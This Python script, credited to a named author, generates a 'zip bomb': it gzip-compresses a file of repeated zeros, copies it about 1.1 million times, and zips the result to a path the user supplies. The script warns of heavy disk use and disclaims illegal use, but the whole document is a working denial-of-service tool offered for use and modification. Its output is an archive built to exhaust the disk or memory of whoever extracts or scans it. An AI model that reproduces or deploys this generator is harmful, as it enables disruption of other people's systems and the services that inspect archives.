"""
Cody by Valentin Svet
Requires python3.7!
Feel free to use and modify this script!
I do not encourage anyone to abuse this script for illegal activities!
"""

import os
import gzip
from shutil import copyfile
import shutil

key = input("The bomber requires over 5Gb free space and can delet folders. Do you really want to start the bomber[yes/no]")
print("We are generating your bomb. This can take some time.")

if key == "yes":
    pass
else:
    exit()

path = 'zipbomb'
if not os.path.exists(path):
    os.makedirs(path)
else:
    pass


page = open('zipbomb/page.txt', 'w')
page.write('00'*1024*1024)

with open('zipbomb/page.txt', 'rb') as f_in, gzip.open('zipbomb/page.7z', 'wb') as f_out:
    shutil.copyfileobj(f_in, f_out)

page.close()
os.remove('zipbomb/page.txt')

list =['0','1']
k = 1100000
while k != 1:
    k += -1
    list.append(str(int(list[-1]) + int(1)))

for i in list:
   copyfile('zipbomb/page.7z', 'zipbomb/page'+ i + '.7z')

shutil.make_archive(str(input("Enter path and name: ")), 'zip', 'zipbomb')
shutil.rmtree('zipbomb')
print("Yor bomb is ready for your test. Good Luck!")
exit()
